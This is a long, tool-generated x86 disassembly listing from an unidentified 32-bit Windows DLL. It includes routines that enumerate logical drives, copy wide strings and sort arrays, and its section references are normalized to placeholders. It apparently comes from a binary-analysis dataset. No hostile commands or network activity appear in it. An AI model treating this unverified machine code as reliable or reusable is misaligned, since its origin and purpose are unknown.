push ebx
mov ebx eax
push 0x5
call sub_1001763e
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_10017778
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
mov ebx eax
push 0x26
call sub_1001763e
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_10017790
push 0x7c
mov eax sub_100517ea
call sub_1002b30f
xor eax eax
mov [ ebp - 0x4 ] eax
push eax
mov [ ebp - 0x38 ] ecx
mov ebx 0x104
push ebx
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x3c ] eax
call sub_10004a57
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov esi [ GetLogicalDriveStringsW@IAT ]
push eax
mov eax [ ebp - 0x1c ]
add eax eax
push eax
call esi
mov edi r--data
push edi
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x34 ] eax
call sub_10001ebc
cmp [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x60 ]
push eax
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_100020e2
push 0x0
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x30 ]
call sub_1001534a
cmp [ ebp - 0x34 ] ebx
jbe r-xdata
lea eax [ ebp - 0x2c ]
mov ebx [ ebp - 0x38 ]
push ebx
call sub_1001531a
xor eax eax
inc eax
push eax
sub esp 0x14
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x44 ]
mov esi esp
mov [ ebp - 0x44 ] r--data
mov [ ebp - 0x40 ] r--data
mov [ ebp - 0x34 ] esp
call sub_10017924
lea eax [ ebp - 0x30 ]
push eax
call sub_10017998
mov ecx [ ebx + 0x10 ]
add esp 0x1c
mov eax ecx
sub eax [ ebx + 0xc ]
push 0x1c
cdq
pop esi
idiv esi
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000264e
mov eax ebx
call sub_1002b392
retn
push ecx
lea eax [ ecx - 0x1c ]
call sub_100139b7
add [ ebx + 0x10 ] 0xffffffe4
push eax
mov eax [ ebp - 0x1c ]
add eax eax
push eax
call esi
push edi
lea ecx [ ebp - 0x60 ]
mov esi eax
call sub_10001ebc
lea eax [ ebp - 0x60 ]
push eax
test esi esi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x3
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x1
call sub_100020e2
cmp esi [ ebp - 0x1c ]
je r-xdata
lea eax [ ebp - 0x2c ]
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001ebc
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001eec
push r--data
lea eax [ ebp - 0x88 ]
push eax
call sub_1002ae74
sub_10017924
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
and [ ebp - 0x4 ] 0x0
and [ esi ] 0x0
push ebx
sub eax ecx
push edi
mov edi eax
sar edi 0x1
mov [ ebp - 0x8 ] ecx
mov [ esi + 0x10 ] edi
cmp edi 0x8
ja r-xdata
xor ecx ecx
push 0x2
pop edx
mov eax edi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10022df7
pop ecx
mov [ esi ] eax
mov ebx eax
mov ebx esi
jmp r-xdata
mov eax [ esi + 0x10 ]
lea eax [ ebx + eax * 2 ]
mov ecx eax
sub ecx ebx
sar ecx 0x1
push ecx
push eax
push ebx
call sub_10017fee
add esp 0xc
pop edi
mov eax esi
pop ebx
leave
retn
add edi edi
push edi
push [ ebp - 0x8 ]
push edi
push ebx
call sub_100275d0
add esp 0x10
test edi edi
jle r-xdata
sub_10017998
push 0x8
mov eax sub_10051796
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
sub esp 0x18
mov [ ebp - 0x10 ] esp
mov edi esp
push [ ebp + 0x20 ]
lea eax [ ebp + 0xc ]
sub esp 0x14
mov esi esp
mov [ ebp - 0x10 ] esp
call sub_100179fc
call sub_10017a3e
add esp 0x18
push [ ebp + 0x8 ]
mov edi ebx
call sub_10017ac9
add esp 0x1c
cmp [ ebp + 0x1c ] 0x8
mov esi eax
jbe r-xdata
mov eax esi
call sub_1002b37e
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
push [ ebp + 0xc ]
call sub_10027c56
pop ecx
sub_100179fc
push edi
mov edi eax
mov eax [ edi + 0x10 ]
and [ esi ] 0x0
mov [ esi + 0x10 ] eax
cmp eax 0x8
ja r-xdata
xor ecx ecx
push 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10022df7
mov [ esi ] eax
mov edi [ edi ]
pop ecx
mov eax esi
jmp r-xdata
mov ecx [ esi + 0x10 ]
add ecx ecx
push ecx
push edi
push eax
call sub_1002a0f0
add esp 0xc
mov eax esi
pop edi
retn
sub_10017a3e
push 0x3c
mov eax sub_1004fae3
call sub_1002b2a6
xor ebx ebx
mov [ ebp - 0x48 ] ebx
lea eax [ ebp + 0x8 ]
lea esi [ ebp - 0x44 ]
mov [ ebp - 0x4 ] ebx
call sub_100179fc
mov eax esi
lea esi [ ebp - 0x28 ]
mov [ ebp - 0x4 ] 0x1
call sub_100179fc
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x14 ] eax
jbe r-xdata
lea eax [ ebp - 0x28 ]
mov esi edi
mov [ ebp - 0x4 ] 0x2
call sub_100179fc
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x14 ]
mov [ edi + 0x14 ] eax
jbe r-xdata
cmp [ ebp - 0x44 ] ebx
je r-xdata
cmp [ ebp + 0x18 ] 0x8
jbe r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
push [ ebp - 0x44 ]
call sub_10027c56
pop ecx
mov eax edi
call sub_1002b37e
retn
cmp [ ebp + 0x8 ] ebx
je r-xdata
push [ ebp - 0x28 ]
call sub_10027c56
pop ecx
push [ ebp + 0x8 ]
call sub_10027c56
pop ecx
sub_10017ac9
push 0x120
mov eax sub_10051770
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push eax
lea esi [ ebp - 0x3c ]
call sub_10017ceb
pop ecx
push [ ebp - 0x14 ]
lea eax [ ebp + 0xc ]
sub esp 0x18
mov esi esp
mov [ ebp - 0x14 ] esp
call sub_100179fc
push [ ebp - 0x30 ]
mov eax [ ebp + 0x20 ]
push [ ebp - 0x34 ]
lea ecx [ ebp - 0x12c ]
push [ ebp - 0x38 ]
mov [ esi + 0x14 ] eax
push [ ebp - 0x3c ]
call sub_10017d3b
sub esp 0x48
mov [ ebp - 0x4 ] 0x1
mov ebx esp
mov [ ebp - 0x14 ] esp
push eax
call sub_10017c5b
lea eax [ ebp - 0x94 ]
push eax
call sub_10017dcd
add esp 0x50
lea esi [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x3
call sub_10017cc8
push [ ebp - 0x14 ]
xor ecx ecx
sub esp 0x48
mov eax esp
mov [ eax ] ecx
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
mov [ eax + 0x2c ] ecx
mov [ eax + 0x30 ] ecx
mov [ eax + 0x34 ] ecx
mov [ eax + 0x38 ] ecx
mov [ eax + 0x3c ] ecx
lea eax [ ebp - 0xe4 ]
mov [ ebp - 0x14 ] esp
push eax
call sub_10017dcd
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0xe4 ]
mov [ ebp - 0x14 ] esp
mov ebx esp
push eax
call sub_10017c5b
sub esp 0x50
lea eax [ ebp - 0x94 ]
mov [ ebp - 0x40 ] esp
mov ebx esp
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10017c5b
lea eax [ ebp - 0x2c ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10017e06
lea eax [ ebp - 0x2c ]
cmp edi eax
je r-xdata
lea esi [ ebp - 0x2c ]
call sub_100015ca
push [ ebp - 0x2c ]
call sub_100272e8
pop ecx
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x3
call sub_10017cc8
lea esi [ ebp - 0x94 ]
mov [ ebp - 0x4 ] 0x0
call sub_10017cc8
cmp [ ebp + 0x1c ] 0x8
jbe r-xdata
mov eax [ edi ]
mov ecx [ ebp - 0x2c ]
mov [ edi ] ecx
mov [ ebp - 0x2c ] eax
cmp ecx eax
je r-xdata
mov eax edi
call sub_1002b37e
retn
cmp [ ebp + 0xc ] 0x0
je r-xdata
lea eax [ edi + 0xc ]
lea ecx [ ebp - 0x20 ]
cmp eax ecx
je r-xdata
mov esi [ eax ]
mov edx [ ecx ]
mov [ ecx ] esi
mov [ eax ] edx
push [ ebp + 0xc ]
call sub_10027c56
pop ecx
lea eax [ edi + 0x10 ]
lea ecx [ ebp - 0x1c ]
cmp eax ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov [ ebp - 0x20 ] ecx
lea eax [ edi + 0x14 ]
lea ecx [ ebp - 0x18 ]
cmp eax ecx
je r-xdata
mov ecx [ eax ]
mov edx [ ebp - 0x1c ]
mov [ eax ] edx
mov [ ebp - 0x1c ] ecx
mov ecx [ eax ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov [ ebp - 0x18 ] ecx
sub_10017c5b
and [ ebx ] 0x0
mov eax [ esp + 0x4 ]
mov ecx [ eax ]
push esi
push edi
test ecx ecx
je r-xdata
lea esi [ eax + 0x20 ]
lea edi [ ebx + 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov ecx [ eax + 0x34 ]
mov [ ebx + 0x34 ] ecx
mov ecx [ eax + 0x38 ]
mov [ ebx + 0x38 ] ecx
mov ecx [ eax + 0x3c ]
mov [ ebx + 0x3c ] ecx
mov al [ eax + 0x40 ]
pop edi
mov [ ebx + 0x40 ] al
mov eax ebx
pop esi
retn 0x4
mov [ ebx ] ecx
test cl 0x1
je r-xdata
push 0x0
lea edx [ ebx + 0x8 ]
push edx
add eax 0x8
and ecx 0xfffffffe
push eax
call [ ecx ]
mov eax [ esp + 0x18 ]
add esp 0xc
push 0x6
lea esi [ eax + 0x8 ]
lea edi [ ebx + 0x8 ]
pop ecx
[ edi ] [ esi ]
jmp r-xdata
sub_10017cc8
mov eax [ esi ]
test eax eax
je r-xdata
retn
test al 0x1
jne r-xdata
and [ esi ] 0x0
and eax 0xfffffffe
mov eax [ eax ]
lea ecx [ esi + 0x8 ]
test eax eax
je r-xdata
push 0x2
push ecx
push ecx
call eax
add esp 0xc
sub_10017ceb
push ebp
mov ebp esp
sub esp 0x24
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x24 ]
call sub_100025cf
push 0x0
push 0x1
lea ecx [ ebp - 0x24 ]
call sub_1000264e
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
call sub_10009d44
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_10007e38
mov eax [ ebp - 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0xc ] eax
mov eax esi
leave
retn
sub_10017d3b
push 0xc
mov eax sub_100501c2
call sub_1002b2a6
mov edi ecx
mov [ ebp - 0x10 ] edi
and [ ebp - 0x4 ] 0x0
sub esp 0x18
mov esi esp
lea eax [ ebp + 0x18 ]
mov [ ebp - 0x14 ] esp
call sub_100179fc
mov eax [ ebp + 0x2c ]
mov [ esi + 0x14 ] eax
call sub_100180f6
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ edi + 0x20 ] eax
mov [ edi + 0x28 ] eax
mov [ edi + 0x24 ] ecx
mov [ edi + 0x2c ] ecx
mov [ edi + 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x38 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x3c ] eax
lea eax [ ebp + 0x10 ]
mov [ edi + 0x34 ] ecx
push eax
lea ecx [ ebp + 0x8 ]
mov [ edi + 0x40 ] 0x0
call sub_10006d7a
test al al
jne r-xdata
cmp [ ebp + 0x28 ] 0x8
jbe r-xdata
mov esi edi
call sub_10017f3f
mov eax edi
call sub_1002b37e
retn 0x28
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x18 ]
call sub_10027c56
pop ecx
sub_10017dcd
push 0x4
mov eax sub_1004fab0
call sub_1002b2a6
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
xor esi esi
lea eax [ ebp + 0xc ]
inc esi
push eax
mov [ ebp - 0x4 ] esi
call sub_10017c5b
mov [ ebp - 0x10 ] esi
lea esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_10017cc8
mov eax ebx
call sub_1002b37e
retn
sub_10017e06
push 0x8
mov eax sub_1005171c
call sub_1002b2a6
push ecx
mov [ ebp - 0x4 ] 0x1
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x10 ] esp
call sub_1001536e
sub esp 0x50
mov [ ebp - 0x4 ] 0x2
lea eax [ ebp + 0x5c ]
mov [ ebp - 0x10 ] esp
mov ebx esp
push eax
call sub_10017c5b
sub esp 0x50
lea eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] esp
mov ebx esp
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10017c5b
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
push esi
call sub_1001816e
lea esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0x0
call sub_10017cc8
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp + 0x5c ]
call sub_10017cc8
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn 0xa4
sub_10017e82
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
sub esp 0x14
mov eax ebx
mov esi esp
mov [ ebp - 0x4 ] esp
call sub_100179fc
push [ ebp + 0x1c ]
lea edi [ ebp - 0x10 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10018249
add esp 0x24
lea eax [ ebp + 0x18 ]
push eax
mov ecx edi
call sub_10006d7a
test al al
je r-xdata
cmp [ ebx + 0x14 ] 0x0
mov esi [ ebp - 0x10 ]
mov edi [ ebp - 0xc ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
lea ecx [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] edx
jmp r-xdata
lea eax [ ebp + 0x18 ]
push eax
call sub_10006d7a
test al al
je r-xdata
call sub_10006d3f
pop edi
pop esi
pop ebx
leave
retn 0x18
lea ecx [ ebp - 0x8 ]
call sub_10006f37
mov bx [ eax ]
mov eax [ ebp + 0x8 ]
call sub_100182be
test al al
je r-xdata
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax ] esi
mov [ eax + 0x4 ] edi
mov [ eax + 0xc ] ecx
lea ecx [ ebp - 0x8 ]
call sub_10006d3f
lea ecx [ ebp - 0x8 ]
sub_10017f3f
push ebp
mov ebp esp
sub esp 0x18
cmp [ esi ] 0x0
push ebx
push edi
lea edi [ esi + 0x38 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ edi ]
mov [ ebp - 0x14 ] eax
mov eax ebx
mov [ ebp - 0x10 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] eax
push [ edi + 0x4 ]
lea eax [ ebp - 0x18 ]
push [ edi ]
mov ecx esi
push [ esi + 0x34 ]
push [ esi + 0x30 ]
push eax
call sub_1001830b
mov ebx [ ebp - 0x18 ]
jmp r-xdata
mov eax [ esi + 0x30 ]
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x34 ]
mov [ esi + 0x24 ] eax
mov eax [ ebp - 0x14 ]
mov [ esi + 0x2c ] eax
mov eax [ ebp - 0x10 ]
mov [ esi + 0x28 ] ebx
mov [ esi + 0x30 ] eax
mov eax [ ebp - 0xc ]
pop edi
mov [ esi + 0x34 ] eax
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10006d7a
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] eax
call sub_10006d7a
test al al
je r-xdata
mov eax [ esi + 0x28 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x2c ]
push edi
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_10006d7a
test al al
je r-xdata
mov [ esi + 0x40 ] 0x1
sub_10017fee
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
mov eax edi
sub eax ebx
sar eax 0x1
cmp eax 0x20
jle r-xdata
cmp eax 0x1
jle r-xdata
mov esi [ ebp + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
call sub_100184fc
pop ecx
cmp eax 0x20
jle r-xdata
push edi
lea eax [ esp + 0x14 ]
push ebx
push eax
call sub_1001838c
mov ecx [ esp + 0x1c ]
mov eax esi
cdq
sub eax edx
sar eax 0x1
mov esi eax
cdq
sub eax edx
sar eax 0x1
add esi eax
mov eax edi
sub eax [ esp + 0x20 ]
sub ecx ebx
add esp 0xc
and eax 0xfffffffe
and ecx 0xfffffffe
cmp ecx eax
push esi
jge r-xdata
sub edi ebx
mov [ esp + 0x10 ] edi
sar edi 0x1
cmp edi 0x1
jle r-xdata
push edi
push [ esp + 0x1c ]
call sub_10017fee
mov edi [ esp + 0x1c ]
push [ esp + 0x14 ]
push ebx
call sub_10017fee
mov ebx [ esp + 0x20 ]
jmp r-xdata
mov eax edi
cdq
sub eax edx
mov esi eax
sar esi 0x1
jmp r-xdata
test esi esi
jle r-xdata
mov eax edi
sub eax ebx
sar eax 0x1
add esp 0xc
cmp eax 0x20
jg r-xdata
test esi esi
jg r-xdata
dec esi
movzx eax [ ebx + esi * 2 ]
push eax
mov eax esi
mov ecx ebx
call sub_10018aee
pop ecx
cmp edi 0x1
jle r-xdata
mov esi [ esp + 0x10 ]
dec esi
dec esi
mov eax esi
sar eax 0x1
cmp eax 0x1
mov edi eax
jg r-xdata
movzx eax [ ebx + esi - 0x2 ]
mov cx [ ebx ]
mov [ ebx + esi - 0x2 ] cx
push eax
lea edi [ esi - 0x2 ]
sar edi 0x1
xor eax eax
mov ecx ebx
call sub_10018aee
pop ecx
cmp edi 0x1
jle r-xdata
jmp r-xdata
sub_100180f6
push 0x1c
mov eax sub_1004fc48
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x8 ]
lea esi [ ebp - 0x24 ]
call sub_100179fc
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x10 ] eax
sub esp 0x18
mov [ ebp - 0x4 ] 0x1
and [ edi ] 0x0
mov esi esp
lea eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] esp
call sub_100179fc
mov eax [ ebp - 0x10 ]
push edi
mov [ esi + 0x14 ] eax
call sub_10018787
cmp [ ebp - 0x14 ] 0x8
jbe r-xdata
cmp [ ebp + 0x18 ] 0x8
jbe r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax edi
call sub_1002b37e
retn 0x18
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp - 0x24 ]
call sub_10027c56
pop ecx
push [ ebp + 0x8 ]
call sub_10027c56
pop ecx
sub_1001816e
push 0xb4
mov eax sub_100516de
call sub_1002b2d9
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x4 ] eax
xor ebx ebx
lea esi [ ebp - 0x18 ]
mov [ edi + 0xc ] eax
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] eax
mov [ ebp - 0x4 ] 0x2
call sub_1000986e
lea eax [ ebp + 0x60 ]
push eax
lea ebx [ ebp - 0xc0 ]
call sub_10017c5b
lea eax [ ebp + 0x10 ]
push eax
lea ebx [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x3
call sub_10017c5b
sub esp 0x50
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0x1c ] esp
mov ebx esp
push eax
call sub_10017c5b
sub esp 0x50
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] esp
mov ebx esp
push eax
mov [ ebp - 0x4 ] 0x6
call sub_10017c5b
push [ ebp - 0x14 ]
mov ecx edi
push [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x5
push [ ebp + 0x8 ]
call sub_1001881e
lea esi [ ebp - 0x70 ]
mov [ ebp - 0x4 ] 0x4
call sub_10017cc8
lea esi [ ebp - 0xc0 ]
mov [ ebp - 0x4 ] 0x2
call sub_10017cc8
and [ ebp - 0x4 ] 0x0
lea esi [ ebp + 0x10 ]
call sub_10017cc8
or [ ebp - 0x4 ] 0xffffffff
lea esi [ ebp + 0x60 ]
call sub_10017cc8
call sub_1002b37e
retn 0xa8
sub_10018249
push 0x14
mov eax sub_1004fa74
call sub_1002b2a6
and [ ebp - 0x4 ] 0x0
lea eax [ ebp + 0x18 ]
lea esi [ ebp - 0x20 ]
call sub_100179fc
mov esi [ ebp + 0xc ]
jmp r-xdata
cmp esi [ ebp + 0x14 ]
jne r-xdata
mov bx [ esi ]
lea eax [ ebp - 0x20 ]
call sub_100182be
test al al
jne r-xdata
cmp [ ebp - 0x10 ] 0x8
jbe r-xdata
inc esi
inc esi
cmp [ ebp + 0x28 ] 0x8
mov ecx [ ebp + 0x8 ]
mov eax esi
mov [ ebp + 0xc ] eax
mov [ edi ] ecx
mov [ edi + 0x4 ] eax
jbe r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax edi
call sub_1002b37e
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp - 0x20 ]
call sub_10027c56
pop ecx
push [ ebp + 0x18 ]
call sub_10027c56
pop ecx
sub_100182be
mov ecx [ eax + 0x10 ]
cmp ecx 0x8
jbe r-xdata
push esi
push edi
lea edi [ eax + ecx * 2 ]
mov ecx edi
sub ecx eax
mov esi eax
sar ecx 0x1
jmp r-xdata
mov eax [ eax ]
test ecx ecx
jg r-xdata
mov eax ecx
cdq
sub eax edx
sar eax 0x1
lea edx [ esi + eax * 2 ]
cmp [ edx ] bx
jae r-xdata
cmp esi edi
je r-xdata
mov ecx eax
lea esi [ edx + 0x2 ]
or edx 0xffffffff
sub edx eax
add ecx edx
jmp r-xdata
xor eax eax
cmp bx [ esi ]
jb r-xdata
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
retn
sub_1001830b
push 0x58
mov eax sub_10050197
call sub_1002b2a6
mov eax [ ecx ]
test eax eax
jne r-xdata
push [ ebp + 0x18 ]
add ecx 0x8
push [ ebp + 0x14 ]
and eax 0xfffffffe
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
lea ecx [ ebp - 0x20 ]
push ecx
call [ eax + 0x4 ]
mov edi [ ebp + 0x8 ]
mov esi eax
mov eax [ ebp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x18
movsd [ edi ] [ esi ]
call sub_1002b37e
retn 0x14
push r--data
lea ecx [ ebp - 0x3c ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x64 ]
call sub_10001eec
xor esi esi
push 0x0
inc esi
push esi
lea ecx [ ebp - 0x3c ]
call sub_100020e2
mov [ ebp - 0x64 ] r--data
lea eax [ ebp - 0x64 ]
push eax
mov [ ebp - 0x4 ] esi
call sub_10018574
sub_1001838c
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x1
cdq
push esi
sub eax edx
add ecx 0xfffffffe
push edi
sar eax 0x1
push ecx
lea esi [ ebx + eax * 2 ]
push esi
mov ecx ebx
call sub_10018713
pop ecx
pop ecx
mov eax esi
lea edx [ esi + 0x2 ]
cmp ebx esi
jae r-xdata
cmp edx [ ebp + 0x10 ]
jae r-xdata
movzx edi [ eax ]
lea ecx [ eax - 0x2 ]
movzx esi [ ecx ]
cmp di si
ja r-xdata
mov esi edx
mov [ ebp - 0x4 ] eax
jmp r-xdata
movzx esi [ eax ]
jb r-xdata
cmp esi [ ebp + 0x10 ]
jb r-xdata
jb r-xdata
mov eax ecx
cmp ebx eax
jb r-xdata
movzx ecx [ eax ]
movzx edi [ esi ]
cmp di cx
ja r-xdata
mov ecx [ ebp - 0x4 ]
cmp [ ebp + 0xc ] ecx
jae r-xdata
inc edx
inc edx
cmp edx [ ebp + 0x10 ]
jb r-xdata
inc esi
inc esi
jb r-xdata
mov edi [ ebp - 0x4 ]
cmp edi [ ebp + 0xc ]
jne r-xdata
add ecx 0xfffffffe
movzx ecx [ edx ]
cmp si cx
ja r-xdata
mov ecx edx
inc edx
inc edx
cmp ecx esi
je r-xdata
dec edi
dec edi
mov [ ebp - 0x4 ] edi
cmp esi [ ebp + 0x10 ]
jne r-xdata
cmp esi [ ebp + 0x10 ]
je r-xdata
sub [ ebp - 0x4 ] 0x2
mov edi [ ebp + 0xc ]
dec ecx
dec ecx
cmp edi [ ebp - 0x4 ]
jb r-xdata
jb r-xdata
movzx ebx [ ecx ]
mov [ ecx ] di
mov [ esi ] bx
cmp esi edi
je r-xdata
dec eax
dec eax
cmp edi eax
je r-xdata
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ecx
pop ebx
leave
retn
cmp edx esi
je r-xdata
movzx edi [ ecx ]
movzx ebx [ eax ]
cmp bx di
ja r-xdata
dec eax
dec eax
cmp eax ecx
je r-xdata
movzx ecx [ esi ]
mov bx [ edi ]
mov [ esi ] bx
mov [ edi ] cx
jmp r-xdata
dec edx
dec edx
cmp eax edx
je r-xdata
movzx ecx [ edi ]
mov bx [ eax ]
mov [ edi ] bx
mov [ eax ] cx
inc edx
inc edx
mov edi eax
inc eax
mov ecx esi
inc eax
inc esi
inc esi
cmp edi ecx
je r-xdata
cmp eax edx
je r-xdata
movzx edi [ eax ]
mov bx [ ecx ]
mov [ eax ] bx
mov [ ecx ] di
movzx ecx [ eax ]
mov di [ edx ]
mov [ eax ] di
mov [ edx ] cx
jmp r-xdata
movzx ebx [ edi ]
mov [ ebp - 0x8 ] ebx
mov bx [ ecx ]
mov [ edi ] bx
mov di [ ebp - 0x8 ]
mov [ ecx ] di
jmp r-xdata
movzx ecx [ eax ]
mov di [ edx ]
mov [ eax ] di
mov [ edx ] cx
sub_100184fc
push ebp
mov ebp esp
push ecx
cmp ebx [ ebp + 0x8 ]
je r-xdata
leave
retn
push esi
lea esi [ ebx + 0x2 ]
cmp esi [ ebp + 0x8 ]
je r-xdata
pop esi
mov [ ebp - 0x4 ] 0x2
sub [ ebp - 0x4 ] ebx
push edi
lea eax [ esi - 0x2 ]
movzx ecx [ eax ]
cmp di cx
jae r-xdata
mov eax [ ebp - 0x4 ]
lea eax [ eax + esi - 0x2 ]
sar eax 0x1
test eax eax
jle r-xdata
mov [ edx ] di
movzx ecx cx
mov [ ebx ] di
jmp r-xdata
add eax eax
push eax
mov ecx esi
sub ecx eax
push ebx
inc ecx
push eax
inc ecx
push ecx
call sub_100275d0
add esp 0x10
movzx edi [ esi ]
mov edx esi
cmp di [ ebx ]
jae r-xdata
pop edi
mov [ edx ] cx
mov edx eax
dec eax
dec eax
movzx ecx [ eax ]
cmp di cx
jb r-xdata
inc esi
inc esi
cmp esi [ ebp + 0x8 ]
jne r-xdata
sub_10018574
push 0x80
mov eax sub_10050169
call sub_1002b2a6
push [ ebp + 0x8 ]
lea esi [ ebp - 0x4c ]
call sub_10018909
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x8c ]
push ecx
mov ecx eax
call sub_10018943
pop ecx
pop ecx
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_1002ae74
int3
sub_100185e1
push 0x4
mov eax sub_1004fe31
call sub_1002b2a6
mov esi ecx
mov [ ebp - 0x10 ] esi
mov edi [ ebp + 0x8 ]
push edi
call sub_10018628
xor eax eax
mov [ ebp - 0x4 ] eax
cmp edi eax
